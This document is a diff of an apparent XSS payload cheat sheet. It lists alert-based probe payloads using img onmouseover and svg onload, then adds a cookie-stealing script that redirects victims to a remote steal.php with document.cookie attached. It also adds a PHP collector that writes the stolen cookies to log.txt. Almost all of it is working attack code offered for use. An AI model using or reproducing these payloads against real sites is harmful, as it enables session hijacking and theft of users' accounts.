@@ -1,10 +1,28 @@
 always try to inpuit " ' > 
-<IMG SRC=# onmouseover="alert('xxs')">
-<svg/onload=alert('XSS')>
-<IMG SRC= onmouseover="alert('xxs')">
-<IMG onmouseover="alert('xxs')">
+<IMG SRC=# onmouseover="alert('1')">
+<svg/onload=alert('2')>
+<IMG SRC= onmouseover="alert('3')">
+<IMG onmouseover="alert('4')">
 
+ --------------------------------------------------------------
+| below xss post cookie to log.txt with the help of steal.php |
+ --------------------------------------------------------------
+ 
+ ================
+|       XSS      |
+ ================
 <IMG """><script type="text/javascript">
-document.location='http://me.foomegahost.com/ticketAttachments/4b3519fbe17e82993e76927e5f253e33/steal.php?q='+document.cookie;
+document.location='http://xss.com/steal.php?q='+document.cookie;
 </script>
 
+ ================
+|    steal.php   |
+ ================
+ <?php
+$fn="log.txt";
+$fh=fopen($fn,'a');
+$cookie=$_GET['q'];
+fwrite($fh,$cookie . "\n\n");
+fclose($fh);
+?>
+ 
